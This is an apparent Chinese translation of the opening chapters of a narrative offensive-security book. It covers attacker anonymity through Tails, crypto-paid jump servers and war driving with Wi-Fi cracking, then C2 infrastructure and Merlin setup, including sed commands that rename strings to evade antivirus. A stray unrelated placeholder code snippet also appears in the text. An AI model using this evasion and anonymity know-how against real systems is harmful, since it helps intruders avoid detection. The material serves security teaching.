
# 像幽灵一样黑客：突破云端

![](img/961e81aef23040d0fbe348f58c055860_0_0.png)

![](img/961e81aef23040d0fbe348f58c055860_0_1.png)

![](img/961e81aef23040d0fbe348f58c055860_1_0.png)

献给我可爱的妻子 Nastya

## 关于作者

Sparc Flow 是一名专门从事道德黑客的计算机安全专家。他曾在 Black Hat、DEF CON、Hack In The Box 等国际安全会议上发表研究成果。虽然他的日常工作主要包括黑客攻击公司并向他们展示如何修复其安全漏洞，但他的热情仍然在于编写和分享安全工具和技术。他的其他作品包括：

- 如何像色情明星一样黑客攻击
- 如何像上帝一样黑客攻击
- 如何像摇滚明星一样调查
- 如何像传奇一样黑客攻击

## 关于技术审阅者

Matt Burrough 是一名企业红队的资深渗透测试员，负责评估云计算服务和内部系统的安全性。他也是《Pentesting Azure Applications》（No Starch Press, 2018）的作者。Matt 拥有罗切斯特理工学院网络、安全和系统管理学士学位，以及伊利诺伊大学厄巴纳-香槟分校计算机科学硕士学位。

本书如何使用 ........................................ xviii

模糊计划 ............................................... xviii

# 第一部分：捉我试试

## 1 在线匿名

VPN 及其缺陷 ...................................... 4

位置、位置、位置。 ............................... 5

操作笔记本电脑。 ....................................... 6

跳转服务器 ............................................ 7

攻击基础设施 ................................... 8

资源 ................................................... 9

## 2 命令与控制的回归

命令与控制的传统 .................................. 11

寻找新的 C2 ..................................... 12

Merlin ..................................................... 13

Koadic. .................................................... 15

SILENTTRINITY .............................................. 17

资源 .................................................. 19

## 3 让基础设施存在

传统方法 ............................................... 21

容器和虚拟化 ............................... 23

命名空间 ................................................. 24

联合文件系统 ........................................... 28

Cgroups. ................................................... 30

IP 伪装 ............................................ 32

自动化服务器设置 ............................... 33

调优服务器 ......................................... 36

推送到生产环境 ..................................... 39

资源 ................................................. 41

# 第二部分：加倍努力

## 4 健康的跟踪

了解 Gretsch Politico ........................ 46

发现隐藏关系 ........................ 47

搜寻 GitHub ........................ 49

提取 Web 域名 ........................ 53

来自证书 ........................ 53

通过收割互联网 ........................ 54

发现所使用的 Web 基础设施 ........................ 56

资源 ........................ 57

## 5 漏洞搜寻

熟能生巧 ........................ 60

揭示隐藏域名 ........................ 60

调查 S3 URL ........................ 62

S3 存储桶安全 ........................ 64

检查存储桶 ........................ 65

检查面向 Web 的应用程序 ........................ 68

使用 WebSocket 拦截 ........................ 69

服务器端请求伪造 ........................ 73

探索元数据 ........................ 73

元数据 API 的肮脏秘密 ........................ 75

AWS IAM ........................ 80

检查密钥列表 ........................ 82

资源 ........................ 83

# 第三部分：完全沉浸

## 6 破裂

服务器端模板注入 ........................ 89

框架指纹识别 ........................ 90

任意代码执行 ........................ 92

确认所有者 ........................ 94

走私存储桶 ........................ 95

使用 S3 的优质后门 ........................ 97

创建代理 ........................ 98

创建操作员 ........................ 100

试图摆脱 ........................ 101

检查特权模式 ........................ 102

Linux 能力 ........................ 103

Docker Socket ........................ 105

资源 ........................ 106

## 7 幕后

Kubernetes 概述 ................................ 108

介绍 Pod ................................ 109

平衡流量 ................................ 113

将应用开放给世界 ................................ 115

Kube 内部原理 ................................ 115

资源 ................................ 119

## 8 肖申克的救赎：越狱

Kube 中的 RBAC ................................ 122

Recon 2.0 ................................ 125

入侵数据存储 ................................ 129

API 探索 ................................ 132

滥用 IAM 角色权限 ................................ 135

滥用服务账户权限 ................................ 136

渗透数据库 ................................ 137



- Redis 与实时竞价 ................................ 140

- 反序列化 ................................ 141

- 缓存投毒 ................................ 143

- Kube 权限提升 ................................ 148

- 资源 ................................ 151

## 9 持久 Shell 153

- 稳定访问 ................................ 155

- 隐蔽后门 ................................ 160

- 资源 ................................ 163

## 第四部分：内部敌人 165

## 10 内部敌人 167

- 通往神化的道路 ................................ 168

- 自动化工具接管 ................................ 172

- 全能 Jenkins ................................ 173

- 地狱厨房 ................................ 174

- 接管 Lambda ................................ 181

- 资源 ................................ 185

## 11 然而，我们坚持了下来 187

- AWS 哨兵 ........................................ 188

- 在极度保密中持久化 ........................................ 190

  - 要执行的程序 ........................................ 191

  - 构建 Lambda ........................................ 192

  - 设置触发事件 ........................................ 193

  - 掩盖我们的踪迹 ........................................ 195

  - 恢复访问 ........................................ 195

- 替代（更差）方法 ........................................ 196

- 资源 ........................................ 197

## 12 神化 199

- 持久化访问： ........................................ 201

  - 理解 Spark ........................................ 204

  - 恶意 Spark ........................................ 205

  - Spark 接管 ........................................ 210

  - 查找原始数据 ........................................ 213

- 窃取处理后的数据 ........................................ 215

  - 权限提升 ........................................ 216

  - 渗透 Redshift ........................................ 220

- 资源 ........................................ 224

## 13 最终剪辑 225

- 入侵 Google Workspace ........................................ 226

  - 滥用 CloudTrail ........................................ 229

- 创建 Google Workspace 超级管理员账户 ........................................ 232

- 偷看一眼 ........................................ 233

- 结束语 ........................................ 235

- 资源 ........................................ 235

## 致谢

我谨向以下人员表达我最诚挚的感谢：

首先要感谢 Liz Chadwick，她敏锐的技能和出色的修改帮助传达了书中晦涩且有时复杂的讯息。

感谢 Matt Burrough 勤勉而专业地审阅代码、命令行以及两者之间的内容。

感谢 No Starch Press 为本书付出努力的许多人，从设计到校对，包括 Katrina Taylor 和 Bart Reed。当然还要感谢 Bill 和 Barbara，正是那次初次会面开启了这段冒险。

感谢我的妻子，她在多方面不断激励着我，最重要的是支持了我突如其来的写作热潮，以及整理这本书所花费的许多沮丧的夜晚。

感谢我的兄弟姐妹，他们的对话激发了我的求知欲。其中一次对话促使我在八个月后出版了我的第一本黑客书籍。

最后，我要对我的父母表达我的感激、爱和钦佩，感谢他们教会我始终保持好奇心并追求卓越。

## 引言

![](img/961e81aef23040d0fbe348f58c055860_15_0.png)

安全行业很棘手。我对这个领域保持着爱恨交织的关系，很大程度上是因为它善变且转瞬即逝的特性。你可能花费数月或数年磨练某一安全领域的技能——比如使用 PowerShell 进行权限提升和横向移动——却在发现自己身处完整的 Linux 或 macOS 环境时感到完全无用。

等你学会如何 dump macOS 钥匙串密钥并击败 Gatekeeper 时，新的 Windows 10 版本已经发布，带有新颖的检测措施，使得几乎所有 PowerShell 攻击都变得无用。你拖着自己回到起跑线：搜寻博客、追逐会议、研究以升级工具并设计新的利用路径。冷静思考，这场竞赛可能看起来完全疯狂。

当然，你总可以通过潜入一家把 Windows XP/2003 视为珍贵濒危物种、不惜一切代价也要保护的财富 500 强公司网络来安慰自己的自尊，但潮水正在追上你。你心里知道自己必须前往更光明的彼岸。

归根结底，这就是 hacking 的全部。被迫抛弃心爱技巧的挫败感，只能与掌握闪亮新技术的兴奋感相媲美。

我们宽泛地将 *hacking* 定义为一套旨在从系统或流程中获得意外结果的技巧和窍门。然而，这些技巧的有效期正以越来越快的速度到期。作为一名安全专业人士或爱好者，你的目标是尽可能寻找和收集有用的技巧。你永远不知道哪一支矛能阻止公牛的冲锋。

在我的其他书籍中，我大量关注与 Windows 相关的攻击，因为大多数财富 500 强公司围绕 Active Directory 设计了大部分环境。它是管理数千用户、服务器和应用程序的首选解决方案。

然而，时代精神正在改变。想要从零搭建基础设施的公司将不再在距离城市 20 英里的共享数据中心裸金属上搭建 Windows 域控制器。说真的，告诉我还有哪个系统管理员愿意管理硬件淘汰和一个拥有 30 台设备、不同防火墙、交换机、路由器和负载均衡器的 ESXi 集群。把那根绳子给我，然后关上门吧！

为什么还要费事，当你可以在几秒钟内在云环境中设置好一切时？数据库、Docker 容器和 Active Directory 几乎只需一键即可，免费试用还能让你的会计师高兴。没错，随着服务器扩展，初始的低价费用会迅速膨胀，但大多数初创公司会很高兴处理这类问题。这意味着业务正在增长。

在本书中，我决定抛弃你在老旧公司中看到的传统架构。让我们看看攻击者如何击败一个现代且值得的对手：一家将技术根基植根于培育且 resilient 的云环境中，并利用 DevOps 实践推动增长的公司。

超越无知管理层和饥饿猎头炒作的流行语，当这些新范式被成功实施时，它们对架构决策和应用设计的影响如此深远，以至于自然需要一套新的技巧和风格来寻找和发现漏洞。在经典环境中可能被忽视或驳回的漏洞，在云环境中突然获得了致命潜力。忘记 SQL 注入吧。一旦你知道一台机器托管在亚马逊网络服务（AWS）上，你就应该关注完全不同的一类漏洞。

攻击者过去常常从一台机器跳到另一台，偷偷绕过防火墙规则，钻进内部数据库、Active Directory 等等。这段旅程通常涉及网络扫描，

流量隧道等等。在云环境中，你可以从全球任何 IP 地址操控基础设施的核心要素。防火墙是否阻止了对某台机器的访问？有了正确的凭证，你就可以通过一次来自中国的 API 调用移除该特定规则，并从菲律宾访问那台“内部”机器。



当然，这并不意味着机器跳跃完全消失了。我们仍然需要相当多的网络技巧才能访问存储业务数据的那个珍贵端点，但目标已有所转变，从控制机器转向控制基础设施本身。

考虑 DevOps——技术公司倡导的另一套关键原则，其宽泛定义为任何自动化软件开发并提升代码交付和可靠性的技术或组织措施。DevOps 涵盖从基础设施即代码到容器化和自动化监控的一切。DevOps 文化的一个主要推论是，公司越来越不害怕更改其基础设施和应用程序。忘掉典型的 IT 格言吧，“如果它在运行，就不要改动它。”当你每周向生产环境部署应用程序五次时，你最好能自如地按自己意愿更改它。

当你将应用程序与运行它的系统解耦时，你就有更大的余地升级系统。当你拥有端到端集成测试时，你可以轻松地修补代码的关键部分而产生最小的副作用。当你拥有基础设施即代码时，你可以防止影子 IT 并紧密监督基础设施中的每台机器——这是许多大公司梦寐以求的奢侈。

这种前沿的 DevOps 实践浪潮削弱了我们历史上用来寻找公司网络漏洞所依赖的假设。黑客会钻进设计系统的人的思维中，乘着错误假设和仓促决策的浪潮。 如果我们自己也困在设计和运行系统的旧方法中，作为黑客的我们又如何做到这一点呢？

当然，这个计算新时代并非全是喷着彩虹的独角兽。1970 年代犯下的惊人错误仍在这一十年中被忠实地——如果不是虔诚地——复制着。在威胁迫在眉睫的当今世界，安全仍被视为“锦上添花”而不是初始最小可行产品（MVP）的核心功能，这难道不荒谬吗？我说的不是离破产只差一轮融资的物联网公司，而是像 Kubernetes、Chef、Spark 等大型科技产品。说出以下这种话的人应该被用钢勺慢慢反复打到倒下：

> “Security in Spark is OFF by default. This could mean you are vulnerable to attack by default.”

但我离题了。我的观点是，DevOps 和向云的转变带来了大量变化，我们的黑客直觉可能需要一些小调整来保持正轨。

这就是点燃并推动我撰写本书的顿悟。

## 本书如何运作

This is not your typical tech book. There won’t be tutorials, in the traditional sense. We take on the role of the hacker, and our target is the (fictional) political consultancy firm Gretsch Politico. I’ll walk you through a day (or several) in the life of a hacker, working from start to finish—from setting up a decent anonymous infrastructure, to performing some preliminary recon, to finally infiltrating and exploiting the target. The companies and names used herein are mostly fictional, with the exception of the obvious ones like Twitter and Kubernetes. So while there is plenty you can adapt and try out (and I encourage you to do so), you won’t be able to follow each step exactly as shown. For example, we’ll eventually hack the emails of the Gretsch Politico CEO, Alexandra Styx. Neither the company nor Styx herself exists.

这不是你典型的技术书籍。传统意义上不会有教程。我们扮演黑客的角色，我们的目标是（虚构的）政治咨询公司 Gretsch Politico。我将带你走过黑客的一天（或几天）生活，从头到尾——从搭建一个体面的匿名基础设施，到进行一些初步侦察，再到最终渗透并利用目标。本文中使用的公司和名称大多是虚构的，除了像 Twitter 和 Kubernetes 这样明显的例外。因此，虽然有很多内容你可以改编和尝试（我鼓励你这样做），但你无法完全按照所示的每一步操作。例如，我们最终会黑掉 Gretsch Politico 首席执行官 Alexandra Styx 的电子邮件。该公司和 Styx 本人都不存在。

As we feel out our journey, we’ll meet many dead ends and roadblocks, but I’ll show you how you can use even the most apparently meagre of results to set you on another path. This is how security works in the real world. Not every route will lead to success, but with enough perseverance, a tad of creativity and sheer luck, you can stumble upon some interesting findings.

在我们摸索旅程的过程中，我们会遇到许多死胡同和障碍，但我会向你展示如何利用即使是最微不足道的成果来指引你走向另一条道路。这就是现实世界中安全工作的运作方式。并非每条路线都会导致成功，但凭借足够的毅力、一点创造力和纯粹的运气，你可能会偶然发现一些有趣的发现。

To preserve our fourth wall, from now on we’ll speak of our targets as though they are as tangible as you or me.

为了保持我们的第四面墙，从现在开始我们将谈论我们的目标，就好像它们像你或我一样具体。

Let’s talk about our target for this new hacking adventure. Gretsch Politico Consulting is a firm that helps future elected officials run their political campaigns. Gretsch Politico (which we’ll also refer to as GP) claims to have millions of data points and complex modeling profiles to effectively engage key audiences. As they nicely put it on their website, “Elections often come down to the last critical voters. Our data management and micro-targeting services help you reach the right people at the right time.”

让我们谈谈这次新黑客冒险的目标。Gretsch Politico Consulting 是一家帮助未来当选官员运营政治竞选的公司。Gretsch Politico（我们也称其为 GP）声称拥有数百万数据点和复杂的建模档案，以有效吸引关键受众。正如他们在网站上优雅地所说，“选举往往取决于最后的关键选民。我们的數據管理和微目标服务帮助你在正确的时间接触到合适的人。”

In laymen’s terms: “We have a huge database of likes and dislikes of millions of people and can push whatever content is necessary to serve your political agenda.”

用外行的话说：“我们拥有数百万人喜好与厌恶的庞大数据库，可以推送任何必要的内容来服务你的政治议程。”

Much clearer but much scarier, right?

更清楚但也更可怕，对吧？

I wish I were making this stuff up, but sadly this whole charade is how almost every so-called democratic election works nowadays, so we might as well make it our training ground for this book’s hacking scenario.

我希望这些都是我编造的，但遗憾的是，这种整套把戏就是如今几乎每场所谓民主选举的运作方式，所以我们不妨把它作为本书黑客场景的训练场。

## The Vague Plan

### 模糊计划



进入`/path/to/xxx`目录，找到`xxx.json`。

在表达式`cvar = avar + bvar`中，加法运算符（`+`）将`avar`与`bvar`相加，得到它们的和`cvar`

在`List.of(arg0, arg1, arg2)`中，`List`接口的工厂方法`of()`接受一系列的元素，返回包含它们的只读列表。

之后我们这样调用`cmd`命令：`cmd arg0 arg1 arg2`。

```
if (condVar > someVal) {console.log("xxx")}
```



现实世界的情况不同。例如，黑客和黑客活动人士没有重来的机会。他们没有具有法律约束力的任务合同的奢侈。他们将自由——不，是生命——押在工具的安全性和基础设施的匿名性上。这就是为什么在我的每本书中，我都坚持写一些基本的操作安全（OpSec）程序以及如何构建匿名且高效的黑客基础设施：一个在我们似乎为自己打造的越来越专制的世界中快速保持安全的指南。我们从如何尽可能在网上匿名开始，使用虚拟专用网络（VPN）、Tor、跳板服务器以及可替换和便携的攻击基础设施。

If you are already intimate with current Command and Control (`C2`) frameworks, containers, and automation tools like `Terraform`, you can just skip ahead to Chapter 4, where the actual hacking begins.

如果你已经熟悉当前的命令与控制（C2）框架、容器以及像 `Terraform` 这样的自动化工具，你可以直接跳到第 4 章，那里才是实际黑客行动的开始。

## VPNs and Their Failings

## VPN 及其缺陷

我希望到 2021 年，几乎每个人都知道将家庭或工作 IP 地址暴露给目标网站是大忌。然而，我发现大多数人很乐意使用承诺完全匿名的 VPN 服务在网站上窥探——他们使用家庭 IP 地址注册，甚至用自己的信用卡连同姓名和地址一起注册。更糟糕的是，他们在观看自己喜欢的 Netflix 节目并在 Facebook 上与朋友聊天时，从家用笔记本电脑上建立了该 VPN 连接。

让我们先把事情说清楚。不管他们怎么说，VPN 服务总是会保留某种形式的日志：IP地址、DNS 查询、活动会话等等。让我们暂时站在一个天真的网民的角度，假装没有法律强制每个接入提供商保留外发连接的基本元数据日志——此类法律在大多数国家都存在，而且没有任何 VPN 提供商会为了你那每月 5 美元的订阅费而违反它们，但请容忍这个坦率的前提。VPN 提供商在全球多个数据中心拥有数百甚至数千台服务器。他们还有数千名用户——有些在 Linux 机器上，其他在 Windows 上，还有一群娇惯的在 Mac 上。你真的相信在没有像日志这样基本的东西的情况下管理如此庞大且异构的基础设施是可能的吗？

NOTE `Metadata` refers to the description of the communication—which IP address talked to which IP, using which protocol, at which time, and so on—but not its content.

NOTE 元数据指的是通信的描述——哪个 IP 地址与哪个 IP 通信，使用哪个协议，在哪个时间等等——但不包括其内容。

没有日志，技术支持就会和打电话来求助问题的困惑客户一样无用且一无所知。公司里没人会知道如何着手修复一个简单的 DNS 查找问题，更不用说涉及丢包、首选路由和其他网络巫术之类的神秘路由问题了。许多 VPN 提供商觉得有义务大声捍卫他们的无日志服务，以跟上做出类似声明的竞争对手，但这是一个谎言，导致了一场毫无意义的逐底竞争，由赤裸裸的谎言驱动——或者说，如我所信，他们现在称之为“营销”。

你对 VPN 提供商最好的期望就是他们不会把客户数据卖给出价最高的人。免费提供商就别考虑了。在时间和金钱上投资你的隐私。我建议从 `AirVPN` 和 `ProtonVPN` 开始，它们都是该行业的认真参与者。

这种对匿名的认知同样适用于 Tor（洋葱路由器，https://www.torproject.org），它承诺通过隐藏你 IP 地址的节点和中继网络匿名穿越互联网。有没有什么理由让你盲目信任进入 Tor 网络时联系的第一个节点，比起一通未经请求的电话——承诺用你的信用卡号码换取失散多年的遗产——更值得信任呢？当然，第一个节点只知道你的 IP 地址，但也许这信息已经太多了。

### 地点，地点，地点

提高匿名性的一种方法是，在进行黑客活动时注意你的物理位置。别误会：Tor 很棒。VPN 也是一个很好的替代方案。但当你确实依赖这些服务时，始终要假设你的 IP 地址——因此你的地理位置和/或浏览器指纹——为这些中介所知，并且可能被你的最终目标或代表他们进行调查的人发现。一旦你接受这一前提，结论自然就会显现：要在互联网上真正匿名，你需要对你的物理足迹给予与互联网指纹同等的关注。

如果你恰好住在大城市，利用繁忙的火车站、商场或类似的公共聚集场所，那里有公共 Wi-Fi，可以安静地进行你的操作。只是日常乘客模糊流中的另一个点。然而，要小心不要落入我们这种爱模式的人性陷阱。不惜一切代价避免日复一日坐在同一个地方。务必经常去新的地点，甚至不时更换城市。

世界上一些地方，如中国、日本、英国、新加坡、美国，甚至法国的一些地区，都有摄像头监控街道和公共场所。在这种情况下，一个替代方案是采用书中最古老的技巧之一：war driving。开车在城市里寻找公共 Wi-Fi 热点。典型的 Wi-Fi 接收器可以接收远达 40 米（约 150 英尺）的信号，而使用定向天线，如 Alfa Networks 的 Wi-Fi 适配器，可以将其增加到几百米（约一千英尺）。一旦你找到一个免费热点，或一个安全性较差可以攻破的热点——WEP 加密和弱 WPA2 密码并不少见，可以用 `Aircrack-ng` 和 `Hashcat` 等工具破解——就在附近停车并开始你的操作。如果你讨厌漫无目的地开车，可以查看像 WiFi Map 这样的在线项目，网址 https://www.wifimap.io，它列出了开放的 Wi-Fi 热点，有时还附带密码。

黑客攻击真的是一种生活方式。如果你真正致力于你的事业，你应该完全拥抱它，并不惜一切代价避免粗心大意。

### 操作笔记本



现在我们已经处理好了位置问题，让我们把笔记本电脑的情况理清楚。人们可能会对自己的笔记本电脑很珍惜，贴满贴纸、疯狂的硬件配置，还有，天哪，那份大家发誓有一天会浏览的书签列表。那是你会在本地会议上炫耀的电脑，而不是你用于操作的电脑。你用来在 Twitter 上发牢骚并检查 Gmail 收件箱的任何电脑，基本上都被大多数政府机构所知。无论有多少 VPN，如果你的浏览器指纹以某种方式泄露给你的目标，都无法拯救你的处境。

出于黑客目的，我们想要一个临时的操作系统（OS），每次重启都会清除一切。我们将此操作系统存储在 USB 闪存盘上，每当我们找到一个不错的落脚点时，就将其插入电脑以加载我们的环境。

Tails（https://tails.boum.org/）是这类用途的首选 Linux 发行版。它会自动轮换 MAC 地址，强制所有连接通过 Tor，并且避免将数据存储在笔记本电脑的硬盘上。（相反，传统操作系统倾向于将内存的一部分存储在磁盘上以优化并行执行，这一操作称为交换）如果它对斯诺登来说足够好，我敢打赌对几乎每个人都足够好。我建议在做任何其他事情之前先设置 Tails OS 并将其存储在外部驱动器上。

有些人莫名其妙地喜欢 Chromebook。这些是搭载在价格实惠的硬件上的极简操作系统，仅支持浏览器和终端。看起来很理想，对吧？不是。它是有史以来最糟糕的主意，仅次于冬天下雨时舔金属杆。我们说的是一个由 Google 开发的操作系统，要求你登录 Google 账号、同步数据并将其存储在 Google Drive 上。我还需要继续吗？有一些 Chromium OS 的分支禁用了 Google 同步部分，例如 NayOS，但主要问题是这些设备并非以隐私为设计目标，在任何情况下都不应用于匿名黑客活动。而如果它们被使用，那么 Google 的发布日一定非常滑稽。

你的操作笔记本电脑只应包含易失性和临时数据，例如浏览器标签页、命令的复制粘贴等等。如果你绝对需要导出大量数据，请确保以加密方式将其存储在便携式存储设备上。

### 跳板服务器

我们笔记本电脑的唯一目的是连接到一组服务器，这些服务器保存了准备冒险所需的工具和脚本：跳板服务器。这些是我们匿名设置的虚拟主机，仅通过 Tor 或 VPN 连接，并信任它们与我们更具恶意的虚拟机（VM）交互并存储我们的战利品。

这些服务器为我们提供了通往未来攻击基础设施的可靠且稳定的网关。要连接到跳板服务器，我们会在确保 VPN 或 Tor 连接建立后直接通过 SSH 进入。我们可以从寒冷而繁忙的火车站的一台随机机器发起 Secure Shell（SSH）连接，然后发现自己进入了一个温暖舒适的环境，我们所有的工具和最喜欢的 Zsh 别名都在那里等待我们。

跳板服务器可以托管在分布在多个地理位置的一个或多个云提供商上。明显的限制是这些提供商支持的支付解决方案。以下是一些价格合理且接受加密货币的云提供商示例：

- RamNode（https://www.ramnode.com/）每月约 $5，提供 1GB 内存和两个虚拟 CPU（vCPU）核心的服务器。仅接受比特币。
- NiceVPS（https://nicevps.net/）每月约 €14.99，提供 1GB 内存和一个 vCPU 核心的服务器。接受门罗币和 Zcash。
- Cinfu（https://www.cinfu.com/）每月约 $4.79，提供 2GB 内存和一个 vCPU 核心的服务器。支持门罗币和 Zcash。
- PiVPS（https://pivps.com/）每月约 $14.97，提供 1GB 内存和一个 vCPU 核心的服务器。支持门罗币和 Zcash。
- SecureDragon（https://securedragon.net/）每月约 $4.99，提供 1GB 内存和两个 vCPU 核心的服务器。仅接受比特币。

一些服务，如 BitLaunch（https://bitlaunch.io/），可以充当简单的中介。BitLaunch 接受比特币支付，但随后使用自己的账户在 DigitalOcean 和 Linode 上创建服务器（价格当然是三倍，简直离谱）。另一个交易稍好的中介服务是 bithost（https://bithost.io/），它仍然收取 50% 的佣金。除了明显的宰客之外，权衡在于这两个提供商都不给你访问 DigitalOcean API 的权限，而这可以帮助自动化大部分设置。

选择云提供商可能归结为这种苦涩的权衡：加密货币的支持及其提供的伪匿名性与易用性和自动化之间的取舍。

所有主要云提供商——AWS、Google Cloud、Microsoft Azure、阿里巴巴等等——在批准你的账户之前都需要信用卡。根据你居住的地方，这可能不是问题，因为有很多服务提供预付信用卡以换取现金。一些在线服务甚至接受用比特币充值信用卡，但大多数都需要某种形式的政府签发身份证件。这是你应该仔细考虑的风险。

理想情况下，跳板服务器应用于托管 Terraform、Docker 和 Ansible 等管理工具，这些工具稍后将帮助我们构建多个攻击基础设施。图 1-1 展示了该架构的高层概述。

![](img/961e81aef23040d0fbe348f58c055860_28_0.png)

图 1-1：黑客基础设施概述

我们的跳板服务器永远不会与目标交互。连一声响都没有。因此，我们可以在切换前让它们多保留一段时间——几周或几个月——而不会带来显著风险。尽管如此，专门的调查团队可能会找到一种方法将这些系统与用于与目标交互的系统关联起来，因此定期删除并重新创建跳板服务器是个好主意。

### 攻击基础设施

我们的攻击基础设施的波动性远高于跳板服务器，应仅保留几天。如果可能，它应针对每次操作或目标而唯一。我们最不想看到的就是调查人员通过同一个 IP 攻击的不同目标拼凑出各种线索。

攻击基础设施通常由前端和后端系统组成。前端系统可能会向目标发起连接、扫描机器等等。在反向 shell 的情况下，它也可以用于将传入数据包通过 Web 代理路由并适当地传递到后端系统，通常是像 Metasploit 或 Empire 这样的 C2 框架。只有部分请求会被转发到 C2 后端；其他页面则返回平淡无奇的内容，如图 1-2 所示。

![](img/961e81aef23040d0fbe348f58c055860_28_1.png)

图 1-2：数据包路由到后端

这种数据包路由可以用 Nginx 或 Apache 等常规 Web 代理完成，它充当过滤器：来自受感染计算机的请求被直接路由到相应的后端 C2 实例，而剩余的请求——例如来自好奇分析人员的请求——则显示一个无害的网页。后端 C2 框架实际上是攻击基础设施的脊髓，执行受感染机器上的命令、检索文件、投递漏洞利用等等。

你希望你的基础设施是模块化的，可以随时替换。绕过 IP 封禁应该像发送一条命令来生成新的代理一样简单。C2 后端出现问题？输入一条命令，你就拥有一个配置完全相同的新的 C2 后端在运行。

实现这种自动化程度并不是为了尝试最流行的工具和编程技术而异想天开。部署完全配置好的攻击服务器越容易，我们犯的错误就越少，尤其是在压力情况下。这是一个很好的借口，让我们深入了解 DevOps 人员的工作，学习他们的技艺，并将其扭曲以满足我们自己的需求。希望这能让我们了解到一些缺陷，我们稍后将在黑客冒险中利用这些缺陷。下一章将重点介绍构建此后端。

### 资源

- 想了解爱德华·斯诺登在情报界的生活和冒险的精彩记述，请阅读爱德华·斯诺登所著的《永久记录》（Macmillan，2019）。
- 在此搜索 darkAudax 关于破解 WEP 加密通信的教程 https://aircrack-ng.org/。
- 在 https://hakin9.org/ 找到 Brannon Dorsey 关于使用 Aircrack-ng 和 Hashcat 破解 WPA/WPA2 Wi-Fi 路由器的教程
- 在 https://www.howtoforge.com/ 搜索 Muhammad Arul 关于在 Linux 机器上设置 Zsh 的指南。

## 2 命令与控制的回归

![](img/961e81aef23040d0fbe348f58c055860_31_0.png)

让我们通过从任何攻击者的基本工具开始来构建攻击基础设施：命令与控制（C2）服务器。我们将研究三个框架，并在我们用作目标的虚拟机上测试每个框架。首先，我们将看看命令与控制过去是如何完成的，以了解我们是如何走到今天的。

#### 命令与控制的传统

在过去十年的大部分时间里，C2 框架中无可争议的冠军——提供最广泛、最多样化的漏洞利用、stagers 和反向 shell 的框架——是臭名昭著的 Metasploit 框架（https://www.metasploit.com/）。快速搜索一次渗透测试或黑客教程，我敢打赌第一个链接会指向一篇描述如何在 Linux 机器上设置 meterpreter——Metasploit 使用的自定义有效载荷的名称——以实现完全控制的帖子。当然，文章不会提到该工具的默认设置自 2007 年以来已被每个安全产品标记，但让我们不要太愤世嫉俗。



Metasploit 是在没有讨厌的防病毒软件来搅局的情况下控制 Linux 主机时绝对的首选。连接非常稳定，框架拥有大量模块，而且与许多即兴教程所暗示的相反，你可以——事实上应该——自定义用于构建 stager 和漏洞利用的可执行模板的每一个细节。Metasploit 在 Windows 上的表现较差：它缺乏其他框架中 readily 可用的大量 post-exploit 模块，而且 meterpreter 使用的技术是每个防病毒软件清单上的首要项目。

Windows 是一个不同的野兽，我过去更喜欢 Empire 框架（https://github.com/EmpireProject/Empire/），它提供了专门为 Active Directory 设计的详尽的模块、漏洞利用和横向移动技术列表。可惜的是，Empire 已不再由原团队维护，原团队以其 Twitter 账号为人所知：`@harmj0y`、`@sixdub`、`@enigma0x3`、`@rvrsh3ll`、`@killswitch_gui` 和 `@xorrior`。他们在 Windows 黑客社区掀起了一场真正的革命，值得我们最真诚的赞赏。幸运的是，在我们所有人的喜悦中，Empire 被 BC Security 的人重新带回了生命，他们在 2019 年 12 月发布了 3.0 版本。我理解停止维护 Empire 的决定背后的理由：整个框架的诞生基于这样一个前提，即 PowerShell 允许攻击者在 Windows 环境中畅行无阻，不受防病毒软件和监控等卑鄙的预防措施的限制。随着 Windows 10 的功能如 PowerShell 阻止日志记录和 AMSI 对这一假设提出了挑战，停止该项目以支持新一代攻击（如使用 C#，例如 SharpSploit：https://github.com/cobbr/SharpSploit/）是有意义的。

注意 Antimalware Scan Interface（AMSI）是 Windows 10 中引入的一个组件，它拦截对关键 Windows 服务——用户账户控制（UAC）、JScript、PowerShell 等——的 API 调用，以扫描已知威胁并最终阻止它们：https://docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps。

#### 寻找新的 C2

随着 Empire 项目不再是选择，我开始寻找潜在的替代品。我担心不得不退回到 Cobalt Strike，就像 99% 的将钓鱼活动伪装成红队工作的咨询公司一样。我对这个工具没有任何意见——它很棒，提供很棒的模块化，并配得上它取得的成功。只是看到这么多假公司仅仅因为买了 3,500 美元的 Cobalt Strike 许可证就搭上红队业务的顺风车，令人疲惫和沮丧。

然而，我很高兴地发现，在 Empire 留下的真空中，出现了如此多的开源 C2 框架。以下是一些引起我注意的有趣框架的简要介绍。我将相当快速地介绍许多与我们当前场景不太相关的高级概念，并演示每个框架的有效载荷执行。如果你不完全理解某些有效载荷的工作原理，不用担心。我们稍后会回到我们需要的那些。

#### Merlin

Merlin（https://github.com/Ne0nd0g/merlin/）是一个 C2 框架，用 Golang 编写，正如当今大多数流行工具一样。它可以在 Linux、Windows 以及 Go 运行时支持的几乎任何其他平台上运行。部署在目标机器上的代理可以是常规的可执行文件，如 DLL 文件甚至 JavaScript 文件。

要开始使用 Merlin，首先安装 Golang 环境。这将允许你自定义可执行代理并添加 post-exploitation 模块——当然，这是强烈鼓励的。

使用以下命令安装 Golang 和 Merlin：

```bash
root@Lab:~/# add-apt-repository ppa:longsleep/golang-backports
root@Lab:~/# apt update && sudo apt install golang-go
root@Lab:~/# go version
go version go1.13 linux/amd64

root@Lab:~/# git clone https://github.com/Ne0nd0g/merlin && cd merlin
```

Merlin 的真正新颖之处在于它依赖 HTTP/2 与其后端服务器通信。与 HTTP/1.x 相比，HTTP/2 是一种二进制协议，支持许多性能增强功能，如流多路复用、服务器推送等等（一个深入讨论 HTTP/2 的优秀免费资源可以在 https://daniel.haxx.se/http2/http2-v1.12.pdf 找到）。即使安全设备确实捕获并解密了 C2 流量，它也可能无法解析压缩的 HTTP/2 流量，只是原样转发。

如果我们直接编译一个标准代理，任何执行简单字符串查找以查找一般显眼术语的常规防病毒代理都会立即将其查出，因此我们需要进行一些调整。我们将重命名可疑函数，如 `ExecuteShell`，并删除对原始包名 `github.com/Ne0nd0g/merlin` 的引用。我们将使用经典的 `find` 命令来查找包含这些字符串的源代码文件，并将其通过管道传输到 `xargs`，后者将调用 `sed` 用任意单词替换这些可疑术语：

```bash
root@Lab:~/# find . -name '*.go' -type f -print0 | xargs -0 sed -i 's/ExecuteShell/MiniMice/g'
root@Lab:~/# find . -name '*.go' -type f -print0 | xargs -0 sed -i 's/executeShell/miniMice/g'
root@Lab:~/# find . -name '*.go' -type f -print0 | xargs -0 sed -i 's/Ne0nd0g\/merlin\/mini\/heyho//g'
root@Lab:~/# sed -i 's/Ne0nd0g\/merlin\/mini\/heyho//g' go.mod
